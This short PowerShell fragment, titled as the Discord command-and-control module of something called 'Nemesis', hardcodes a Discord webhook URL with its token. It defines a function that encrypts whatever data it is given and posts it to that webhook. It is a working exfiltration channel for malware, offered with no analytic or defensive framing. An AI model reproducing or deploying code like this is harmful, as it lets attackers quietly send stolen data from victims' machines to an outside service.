# ============================================================
# NEMESIS — DISCORD C2 (Encrypted)
# ============================================================

$webhook = "https://discord.com/api/webhooks/1538679964357107742/gp4Fdmc-h0i3Azx90tPm9t-pRlenPKpO1dh-1uOMCxOo6XMLPcTYsSoonKViSM82FxLk"

function Invoke-NemesisReport {
    param($data)
    $encrypted = Encrypt-NemesisData -data $data
    $body = @{ content = "🟢 Nemesis Report: $encrypted" } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
}
